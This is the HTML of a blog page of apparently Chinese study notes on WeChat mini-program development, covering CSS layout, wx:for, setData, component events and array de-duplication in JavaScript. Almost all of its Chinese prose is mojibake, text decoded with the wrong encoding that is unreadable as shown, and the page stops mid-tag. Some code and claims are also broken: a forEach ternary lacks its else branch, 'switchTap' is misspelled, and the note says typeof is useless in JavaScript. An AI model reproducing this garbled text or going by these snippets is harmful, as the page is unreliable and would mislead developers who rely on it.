æ˜¯:è¡Œå†…å…ƒç´ æ²¡æœ‰å®½é«˜ï¼Œè¡Œå†…å…ƒç´ çš„å®½é«˜å…¨éƒ¨æ¥è‡ªäºå†…å®¹çš„é•¿åº¦å’Œé«˜åº¦ã€‚<br>è¡Œå†…å—çº§å…ƒç´ é»˜è®¤ä¹Ÿæ˜¯æ²¡æœ‰è®¾ç½®å®½é«˜ï¼Œä½†æ˜¯è¡Œå†…å—çº§å…ƒç´ å¯ä»¥è®¾ç½®å®½åº¦å’Œé«˜åº¦ã€‚ä¸€æ—¦è®¾ç½®äº†å®½é«˜ä»¥åï¼Œåªè¦æœ‰å‰©ä½™ç©ºé—´å°±å¯ä»¥çœ‹åˆ°å¯¹é½æ–¹å¼çš„æ•ˆæœã€‚</p></li><li><p>å››ç§displayæ˜¾ç¤ºæ¨¡å¼</p><blockquote><ol><li>blockï¼Œä»¥å—çŠ¶æ ‡ç­¾è¿›è¡Œæ˜¾ç¤º</li><li>inlineï¼Œä»¥å†…è”æ ‡ç­¾è¿›è¡Œæ˜¾ç¤º</li><li>inline-blockï¼Œä»¥å—çŠ¶å†…è”æ ‡ç­¾è¿›è¡Œæ˜¾ç¤º ï¼Œç±»ä¼¼å›¾ç‰‡è¿™æ ·çš„ï¼Œä¸€è¡Œå¯ä»¥æœ‰å¤šä¸ªï¼ŒåŒæ—¶å…·æœ‰å®½é«˜ï¼Œå†…å¤–è¾¹è·ã€‚</li><li>noneï¼Œä»¥éšè—æ ‡ç­¾è¿›è¡Œæ˜¾ç¤º[éšè—èµ·æ¥çš„æ ‡ç­¾]ï¼Œç±»ä¼¼<input type="hidden" >ã€‚</li></ol></blockquote></li></ul><hr><h3 id="æ‚é¡¹å¤‡æ³¨"><a href="#æ‚é¡¹å¤‡æ³¨" class="headerlink" title="æ‚é¡¹å¤‡æ³¨"></a>æ‚é¡¹å¤‡æ³¨</h3><p>iPhone6: 1rpx = 0.5px<br>å¾®ä¿¡å°ç¨‹åºï¼š1rem=32rpx<br>webé¡µé¢1rem=å°ç¨‹åº1.25rem=40rpxï¼Œ1rem=32rpx<br>wx:for-item=â€pageâ€ éå†æ•°ç»„é‡å‘½å<br>wx:for-items=â€â€œ wx:for-item=â€postâ€ ä¹Ÿå¯ä»¥è¿™æ ·<br>wx:keyæ›´é‡è¦çš„ä¸€ä¸ªä½œç”¨æ˜¯ä¿æŒæ¸²æŸ“å…ƒç´ çš„çŠ¶æ€ä¸ä¸¢å¤±ï¼Œä¾‹å¦‚æ¸²æŸ“çš„switchè¢«é€‰ä¸­åï¼Œæ•°ç»„å‘ç”Ÿæ”¹å˜é‡æ–°æ¸²æŸ“ï¼Œé€‰ä¸­çŠ¶æ€ä¸ä¸¢å¤±ã€‚</p><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20201206202215441_1461.png"><br>è¿™å ä½ç¬¦å­—ä½“å¤§å°ï¼Œå˜å¤§åï¼Œä¼šç¨ç¨å¾€ä¸‹ç¼©ä¸€ç‚¹ï¼Œåæ­£å¤šè°ƒï¼Œå°±èƒ½è°ƒåˆ°å…‰æ ‡å’Œå ä½ç¬¦ç¬¦åˆçš„å¤§å°ã€‚<br>å¦‚æœä¸¤ä¸ªå­—ä½“å€¼ç›¸åŒï¼Œé‚£å ä½ç¬¦ä¼šæ¯”è¾“å…¥å­—ä½“é«˜ä¸€ç‚¹ã€‚<br>å°±ç¦»è°±ï¼ŒæŠ˜è…¾åŠå¤©ä¸çŸ¥é“è¿™ç©æ„åˆ°åº•æ€ä¹ˆå›äº‹ï¼Œå§‘ä¸”è¿™ä¹ˆè®°ç€å§ã€‚</p><p>ä¸€äº›å€¼ä¸èƒ½ä¸è®¾ï¼Œä¸è®¾ç½®å’Œ0ç»“æœæ˜¯ä¸ä¸€æ ·çš„ã€‚æ¯”å¦‚bottom rightè¿™ç§</p><p>bottomé‡Œçš„view classæ— æ•ˆ<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20201208195533406_13794.png"></p><h3 id="åˆ¤æ–­æ•°æ®ç±»å‹"><a href="#åˆ¤æ–­æ•°æ®ç±»å‹" class="headerlink" title="åˆ¤æ–­æ•°æ®ç±»å‹"></a>åˆ¤æ–­æ•°æ®ç±»å‹</h3><p>æ³¨æ„ï¼ŒJavaScriptä¸€åˆ‡æ•°æ®çš†å¯¹è±¡ï¼Œæ‰€ä»¥typeofæ²¡ç”¨<br>console.log(post[i][â€œcommentâ€] instanceof Array);</p><h3 id="wx-for"><a href="#wx-for" class="headerlink" title="wx:for"></a>wx:for</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html">wx:for="&#123;&#123;navbarTitle&#125;&#125;" wx:key="index"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>indexæ˜¯ä¸‹æ ‡ï¼Œitemæ˜¯å€¼</p><h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3><p>ä¿®æ”¹vï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹åŸæ•°ç»„<br>array.forEach((v,i)=&gt;i===index?v.isActive=true);</p><h3 id="classé‡Œçš„"><a href="#classé‡Œçš„" class="headerlink" title="classé‡Œçš„."></a>classé‡Œçš„.</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210121204349121_29437.png"><br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210121204401620_21780.png"><br>ç±»ä¼¼è¿™æ ·ï¼ŒåŠ ä¸ªdisabledå°±èƒ½åˆ‡æ¢å›¾æ ‡</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.detail_serve_item</span> <span class="token punctuation">&#123;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 6rpx 24rpx 6rpx 0<span class="token punctuation">;</span>    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>    <span class="token property">line-height</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> #8c8c8c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.detail_serve_item::before</span> <span class="token punctuation">&#123;</span>    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>    <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> -4rpx<span class="token punctuation">;</span>    <span class="token property">margin-right</span><span class="token punctuation">:</span> 12rpx<span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 22rpx<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 22rpx<span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>    <span class="token property">background-repeat</span><span class="token punctuation">:</span> no-repeat<span class="token punctuation">;</span>    <span class="token property">background-size</span><span class="token punctuation">:</span> 22rpx auto<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.detail_serve_item.disabled::before</span> <span class="token punctuation">&#123;</span><span class="token comment">/*åŒæ—¶åŒ…å«detail_serve_itemå’Œdisabled*/</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ï¼Œå†™æˆ<code>.disabled.detail_serve_item</code>ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä»–ä»¬ä¸¤è€…å¹¶æ²¡æœ‰ä»€ä¹ˆä¼˜å…ˆçº§</p><h3 id="line-height-ä¸font-size"><a href="#line-height-ä¸font-size" class="headerlink" title="line-height ä¸font-size"></a>line-height ä¸font-size</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210122150337571_384.png"></p><h3 id="data-å¤§å°å†™é—®é¢˜"><a href="#data-å¤§å°å†™é—®é¢˜" class="headerlink" title="data- å¤§å°å†™é—®é¢˜"></a>data- å¤§å°å†™é—®é¢˜</h3><p>data-navbarindex=â€â€œ =ã€‹navbarindex<br>data-navbarIndex=â€â€œ =ã€‹navbarindex<br>data-navbar-index=â€â€œ =ã€‹navbarIndex<br>data-navbar-Index=â€â€œ =ã€‹navbarIndex</p><h3 id="backgroundé—®é¢˜"><a href="#backgroundé—®é¢˜" class="headerlink" title="backgroundé—®é¢˜"></a>backgroundé—®é¢˜</h3><ul><li>background-imageå’Œbackground-size è¦å†™ä¸€èµ·<br>å†™åˆ†æ”¯çš„æ—¶å€™ï¼Œsizeè¦å†™åˆ°åˆ†æ”¯é‡Œè€Œä¸èƒ½å†™ä¸»å¹²ï¼Œå¯èƒ½æ˜¯å› ä¸ºæœ‰å›¾ç‰‡æ‰èƒ½æ§åˆ¶å¤§å°ï¼Œåœ¨å›¾ç‰‡è¿˜æ²¡æœ‰çš„æ—¶å€™å¤§å°æ— æ³•æŒæ§<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210123124518036_4430.png"></li></ul><h3 id="forEaché‡Œè¯»ä¸åˆ°æ•°æ®ä¸æŠ¥é”™"><a href="#forEaché‡Œè¯»ä¸åˆ°æ•°æ®ä¸æŠ¥é”™" class="headerlink" title="forEaché‡Œè¯»ä¸åˆ°æ•°æ®ä¸æŠ¥é”™"></a>forEaché‡Œè¯»ä¸åˆ°æ•°æ®ä¸æŠ¥é”™</h3><p>è¿™æ ·æŠ¥é”™ï¼š<code>arr.push(&#123;abc:res.data.data.adfadfasdfasdf&#125;)</code><br>è¿™æ ·ä¸æŠ¥é”™ï¼š</p><pre class="line-numbers language-none"><code class="language-none">res.data.data.forEach((i) &#x3D;&gt; &#123;   arr.push(&#123;abc: i.asdfasdfasdfsd,&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="wxsä¿ç•™å°æ•°é—®é¢˜"><a href="#wxsä¿ç•™å°æ•°é—®é¢˜" class="headerlink" title="wxsä¿ç•™å°æ•°é—®é¢˜"></a>wxsä¿ç•™å°æ•°é—®é¢˜</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210126161250329_8788.png"><br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210126161304458_8462.png"><br>æ— è¯­ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><h3 id="ä¿ç•™æ•´æ•°é—®é¢˜"><a href="#ä¿ç•™æ•´æ•°é—®é¢˜" class="headerlink" title="ä¿ç•™æ•´æ•°é—®é¢˜"></a>ä¿ç•™æ•´æ•°é—®é¢˜</h3><p><code>&#123;&#123;price|int&#125;&#125;</code></p><h3 id="redirectTo-navigateTo-switchTap-åŒºåˆ«"><a href="#redirectTo-navigateTo-switchTap-åŒºåˆ«" class="headerlink" title="redirectTo/navigateTo/switchTap åŒºåˆ«"></a>redirectTo/navigateTo/switchTap åŒºåˆ«</h3><blockquote><p>redirectToï¼šå…³é—­å½“å‰é¡µ(å¸è½½)ï¼Œè·³è½¬åˆ°æŒ‡å®šé¡µ<br>navigateToï¼šä¿ç•™å½“å‰é¡µ(éšè—)ï¼Œè·³è½¬åˆ°æŒ‡å®šé¡µ<br>switchTapï¼šåªèƒ½ç”¨äºè·³è½¬åˆ°tabbaré¡µé¢ï¼Œå¹¶å…³é—­å…¶ä»–étabbaré¡µé¢,tabbarä¹‹é—´åšåˆ‡æ¢</p></blockquote><h3 id="then-é¿å…æ•°æ®æ²¡ç­‰åˆ°æƒ…å†µ"><a href="#then-é¿å…æ•°æ®æ²¡ç­‰åˆ°æƒ…å†µ" class="headerlink" title=".then()é¿å…æ•°æ®æ²¡ç­‰åˆ°æƒ…å†µ"></a>.then()é¿å…æ•°æ®æ²¡ç­‰åˆ°æƒ…å†µ</h3><p>.then()å‰çš„æ–¹æ³•æ‰§è¡Œå®Œåå†æ‰§è¡Œthen()å†…éƒ¨çš„ç¨‹åºï¼Œè¿™æ ·å°±é¿å…äº†ï¼Œæ•°æ®æ²¡è·å–åˆ°ç­‰çš„é—®é¢˜ã€‚</p><h3 id="inputå’Œå ä½ç¬¦å±…ä¸­é—®é¢˜"><a href="#inputå’Œå ä½ç¬¦å±…ä¸­é—®é¢˜" class="headerlink" title="inputå’Œå ä½ç¬¦å±…ä¸­é—®é¢˜"></a>inputå’Œå ä½ç¬¦å±…ä¸­é—®é¢˜</h3><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span> 32rpx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸»è¦å°±æ˜¯heightæ”¹ä¸€æ”¹ï¼Œæ”¹æˆautoçœæ—¶çœåŠ›ã€‚</p><h3 id="getå‘åŒ…é‡Œçš„dataé—®é¢˜"><a href="#getå‘åŒ…é‡Œçš„dataé—®é¢˜" class="headerlink" title="getå‘åŒ…é‡Œçš„dataé—®é¢˜"></a>getå‘åŒ…é‡Œçš„dataé—®é¢˜</h3><p>wx.requesté‡Œçš„getå‘åŒ…ï¼Œä¼šè‡ªåŠ¨ç»„åˆdataé‡Œçš„paramï¼Œè¯•äº†ä¸‹mockä¹Ÿè¿™æ ·ï¼Œå§‘ä¸”è®¤ä¸ºå‰ç«¯éƒ½è¿™æ ·ã€‚<br>pythä¼¼ä¹ä¸ä¼šï¼Ÿä¸€äº›å®¢æˆ·ç«¯æ¯”å¦‚burpsuiteå•¥çš„å°±è¯¥æ˜¯å“ªå°±æ˜¯å“ª</p><h3 id="wx-key-â€™indexâ€™-ä¼¼ä¹åªèƒ½ç”¨indexï¼Ÿ"><a href="#wx-key-â€™indexâ€™-ä¼¼ä¹åªèƒ½ç”¨indexï¼Ÿ" class="headerlink" title="wx:key=â€™indexâ€™ ä¼¼ä¹åªèƒ½ç”¨indexï¼Ÿ"></a>wx:key=â€™indexâ€™ ä¼¼ä¹åªèƒ½ç”¨indexï¼Ÿ</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210220235846721_3510.png"><br>è¯•äº†ä¸‹å…¶ä»–å‚æ•°ä¸ç”Ÿæ•ˆï¼Œè›®æ€ªçš„</p><h3 id="width-100-é—®é¢˜"><a href="#width-100-é—®é¢˜" class="headerlink" title="width:100%é—®é¢˜"></a>width:100%é—®é¢˜</h3><p>æœ‰å¯èƒ½æ— æ•ˆï¼Œæ¢æˆ750rpxå¯ä»¥ã€‚</p><p>ä»¥ä¸‹å§‘ä¸”è®¤ä¸ºæ˜¯ï¼šä¸è®¾flexï¼Œé‚£å°±æ˜¯ç”»å‡ºsquareå¤§å°ç„¶åæ‹‰é•¿ã€‚è®¾äº†é‚£å°±æŒ‰ç…§flexæ ·å¼å±…ä¸­<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210304194217411_28066.png"></p><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210304194231973_32239.png"></p><h3 id="amp-amp-å’Œ"><a href="#amp-amp-å’Œ" class="headerlink" title="&amp;&amp;å’Œ||"></a>&amp;&amp;å’Œ||</h3><p>&amp;&amp;è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§äº||<br><strong>a || b</strong></p><blockquote><p>å¦‚æœaæ˜¯trueï¼Œé‚£ä¹ˆbä¸ç®¡æ˜¯trueè¿˜æ˜¯falseï¼Œéƒ½è¿”å›trueã€‚å› æ­¤ä¸ç”¨åˆ¤æ–­bäº†ï¼Œè¿™ä¸ªæ—¶å€™åˆšå¥½åˆ¤æ–­åˆ°aï¼Œå› æ­¤è¿”å›aã€‚<br>å¦‚æœaæ˜¯falseï¼Œé‚£ä¹ˆå°±è¦åˆ¤æ–­bï¼Œå¦‚æœbæ˜¯trueï¼Œé‚£ä¹ˆè¿”å›trueï¼Œå¦‚æœbæ˜¯falseï¼Œè¿”å›falseï¼Œå…¶å®ä¸å°±æ˜¯è¿”å›bäº†å—ã€‚</p></blockquote><p><strong>a &amp;&amp; b</strong></p><blockquote><p>å¦‚æœaæ˜¯falseï¼Œé‚£ä¹ˆbä¸ç®¡æ˜¯trueè¿˜æ˜¯falseï¼Œéƒ½è¿”å›falseï¼Œå› æ­¤ä¸ç”¨åˆ¤æ–­bäº†ï¼Œè¿™ä¸ªæ—¶å€™åˆšå¥½åˆ¤æ–­åˆ°aï¼Œå› æ­¤è¿”å›aã€‚<br>å¦‚æœaæ˜¯trueï¼Œé‚£ä¹ˆå°±è¦åœ¨åˆ¤æ–­bï¼Œå’Œåˆšåˆšä¸€æ ·ï¼Œä¸ç®¡bæ˜¯trueæ˜¯falseï¼Œéƒ½è¿”å›bã€‚</p></blockquote><h3 id="this-setDataä¸this-data"><a href="#this-setDataä¸this-data" class="headerlink" title="this.setDataä¸this.data"></a>this.setDataä¸this.data</h3><p><code>this.setData(&#123;&#125;)</code>ç”¨äºå°†æ•°æ®ä»é€»è¾‘å±‚å‘é€åˆ°è§†å›¾å±‚ï¼ˆå¼‚æ­¥ï¼‰ï¼ŒåŒæ—¶æ”¹å˜å¯¹åº”çš„<code> this.data</code> çš„å€¼ï¼ˆåŒæ­¥ï¼‰ã€‚<br>ç”¨<code>this.data</code>è€Œä¸ç”¨<code>this.setData(&#123;&#125;)</code>ä¼šé€ æˆé¡µé¢å†…å®¹ä¸æ›´æ–°çš„é—®é¢˜ã€‚<br>ç®€è€Œè¨€ä¹‹å°±æ˜¯ï¼šéœ€è¦é¡µé¢æ›´æ–°å¿…é¡»ç”¨<code>this.setData()</code></p><hr><h2 id="å†™æ³•è®°å½•"><a href="#å†™æ³•è®°å½•" class="headerlink" title="å†™æ³•è®°å½•"></a>å†™æ³•è®°å½•</h2><h3 id="çˆ¶ä¼ å­å±æ€§ï¼Œå­ä¼ çˆ¶æ–¹æ³•"><a href="#çˆ¶ä¼ å­å±æ€§ï¼Œå­ä¼ çˆ¶æ–¹æ³•" class="headerlink" title="çˆ¶ä¼ å­å±æ€§ï¼Œå­ä¼ çˆ¶æ–¹æ³•"></a>çˆ¶ä¼ å­å±æ€§ï¼Œå­ä¼ çˆ¶æ–¹æ³•</h3><h4 id="çˆ¶ä¼ å­å±æ€§"><a href="#çˆ¶ä¼ å­å±æ€§" class="headerlink" title="çˆ¶ä¼ å­å±æ€§"></a>çˆ¶ä¼ å­å±æ€§</h4><p>åœ¨çˆ¶é‡Œç›´æ¥å†™<br><code>goodsid=&#39;abcd&#39;</code><br>ç„¶ååœ¨å­é‡Œè®¾ç½®æ¥æ”¶çš„å€¼</p><p>è¿™ä¸ªå€¼å°±å½“åšdataé‡Œçš„å€¼ç›´æ¥ç”¨å³å¯ã€‚</p><h4 id="å­ä¼ çˆ¶æ–¹æ³•"><a href="#å­ä¼ çˆ¶æ–¹æ³•" class="headerlink" title="å­ä¼ çˆ¶æ–¹æ³•"></a>å­ä¼ çˆ¶æ–¹æ³•</h4><p>å­ç»‘å®šçš„äº‹ä»¶</p><pre class="line-numbers language-none"><code class="language-none">onNavBarTap(e) &#123;  this.triggerEvent(&quot;jump&quot;, &#123; navbarTapIndex &#125;);&#125;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨çˆ¶äº†å†™<code>bind:jump=&quot;autoScroll&quot;</code>,å°†å­å’Œçˆ¶è”åŠ¨ï¼Œæ‰§è¡Œ<code>autoScrol(e)</code><br>è€Œä¼ è¿‡æ¥çš„å‚æ•°åœ¨<code>e.detail.navbarTapIndex</code></p><h3 id="èƒŒæ™¯è‰²å æ»¡æ•´ä¸ªå±å¹•"><a href="#èƒŒæ™¯è‰²å æ»¡æ•´ä¸ªå±å¹•" class="headerlink" title="èƒŒæ™¯è‰²å æ»¡æ•´ä¸ªå±å¹•"></a>èƒŒæ™¯è‰²å æ»¡æ•´ä¸ªå±å¹•</h3><pre class="line-numbers language-none"><code class="language-none">page&#123;background-color:#111;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>pageå‰é¢æ²¡æœ‰ç‚¹</p><h3 id="å¥½çœ‹çš„çº¢è‰²æ¤­åœ†æŒ‰é’®"><a href="#å¥½çœ‹çš„çº¢è‰²æ¤­åœ†æŒ‰é’®" class="headerlink" title="å¥½çœ‹çš„çº¢è‰²æ¤­åœ†æŒ‰é’®"></a>å¥½çœ‹çš„çº¢è‰²æ¤­åœ†æŒ‰é’®</h3><pre class="line-numbers language-none"><code class="language-none">.buy &#123;    margin: 12rpx 24rpx 0;    font-weight: 700;    display: block;    width: 226rpx;    height: 76rpx;    line-height: 76rpx;    text-align: center;    font-size: 26rpx;    border-radius: 40rpx;    background-color: #f2270c;    color: #fff;    font-size: 28rpx;    background-image: linear-gradient(135deg, #f2140c, #f2270c 70%, #f24d0c);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¸æ˜¯æœ€åä¸€ä¸ªå­å…ƒç´ "><a href="#ä¸æ˜¯æœ€åä¸€ä¸ªå­å…ƒç´ " class="headerlink" title="ä¸æ˜¯æœ€åä¸€ä¸ªå­å…ƒç´ "></a>ä¸æ˜¯æœ€åä¸€ä¸ªå­å…ƒç´ </h3><pre class="line-numbers language-none"><code class="language-none">.word:not(:last-child) &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å‘å³å°ç®­å¤´cssç›´æ¥å†™"><a href="#å‘å³å°ç®­å¤´cssç›´æ¥å†™" class="headerlink" title="å‘å³å°ç®­å¤´cssç›´æ¥å†™"></a>å‘å³å°ç®­å¤´cssç›´æ¥å†™</h3><pre class="line-numbers language-none"><code class="language-none">.shop_name::after &#123;    content: &quot;&quot;;    display: block;    width: 16rpx;    height: 16rpx;    border-top: 2rpx solid #999;    border-left: 2rpx solid #999;    transform-origin: 50%;    transform: rotate(135deg);    position: absolute;    width: 12rpx;    height: 12rpx;    right: 10rpx;    top: 50%;    margin-top: -8rpx;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å›¾ç‰‡å’Œæ–‡å­—å¯¹é½"><a href="#å›¾ç‰‡å’Œæ–‡å­—å¯¹é½" class="headerlink" title="å›¾ç‰‡å’Œæ–‡å­—å¯¹é½"></a>å›¾ç‰‡å’Œæ–‡å­—å¯¹é½</h3><p>å¤–å±‚çš„viewè¦åŠ vertical-align: middle;<br>å†…å±‚çš„imgä¹Ÿè¦åŠ vertical-align: middle;</p><h3 id="å–æ•´"><a href="#å–æ•´" class="headerlink" title="å–æ•´"></a>å–æ•´</h3><p>1.å¯¼å…¥wxs<br>2.<code>&#123;&#123;price | Int&#125;&#125;</code></p><h3 id="å¤šè¡Œæº¢å‡ºæ–‡å­—å˜æˆçœç•¥å·"><a href="#å¤šè¡Œæº¢å‡ºæ–‡å­—å˜æˆçœç•¥å·" class="headerlink" title="å¤šè¡Œæº¢å‡ºæ–‡å­—å˜æˆçœç•¥å·"></a>å¤šè¡Œæº¢å‡ºæ–‡å­—å˜æˆçœç•¥å·</h3><p>ä¸è¿‡å¾—ç¡®å®šè¦å‡ è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">display: -webkit-box;-webkit-line-clamp: 2; &#x2F;&#x2F;è¡Œæ•°-webkit-box-orient: vertical;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="templateä½¿ç”¨"><a href="#templateä½¿ç”¨" class="headerlink" title="templateä½¿ç”¨"></a>templateä½¿ç”¨</h3><p><code>&lt;template is=&quot;showcase-book&quot; data=&quot;&#123;&#123;books: recommendBooks&#125;&#125;&quot;&gt;&lt;/template&gt;</code></p><pre class="line-numbers language-none"><code class="language-none">&lt;template name&#x3D;&quot;showcase-book&quot;&gt;    &lt;view wx:for&#x3D;&quot;&#123;&#123;books&#125;&#125;&quot; wx:key&#x3D;&quot;id&quot;&gt;&lt;&#x2F;view&gt;&lt;&#x2F;template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ä¸€è¡Œmapæ·»åŠ æ•°ç»„"><a href="#ä¸€è¡Œmapæ·»åŠ æ•°ç»„" class="headerlink" title="ä¸€è¡Œmapæ·»åŠ æ•°ç»„"></a>ä¸€è¡Œmapæ·»åŠ æ•°ç»„</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210220234651381_11894.png"><br><code>recommendBooks: res[0].data.map((i) =&gt; i.book)</code><br>æŒºç‰›çš„<br>mapç›¸å½“äºå–æ•°ç»„æ¯ä¸ªå…ƒç´ ,åé¢çš„lamdaè¡¨è¾¾å¼ç›¸å½“äºreturnæ¯ä¸ªæ•°ç»„çš„i.book</p><h3 id="æ•°ç»„å»é‡"><a href="#æ•°ç»„å»é‡" class="headerlink" title="æ•°ç»„å»é‡"></a>æ•°ç»„å»é‡</h3><p>åˆ©ç”¨å¯¹è±¡çš„å±æ€§ä¸ä¼šé‡å¤è¿™ä¸€ç‰¹æ€§ï¼Œæ ¡éªŒæ•°ç»„å…ƒç´ æ˜¯å¦é‡å¤</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">distinct</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">let</span> arr <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">of</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> result<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨Setæˆå‘˜å”¯ä¸€æ€§</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">distinct</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>a<span class="token punctuation">,</span> <span class="token operator">...</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//...ä¹Ÿæ˜¯ä¸€ç§è¿ç®—ç¬¦</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å¿ƒå¾—ç§¯ç´¯"><a href="#å¿ƒå¾—ç§¯ç´¯" class="headerlink" 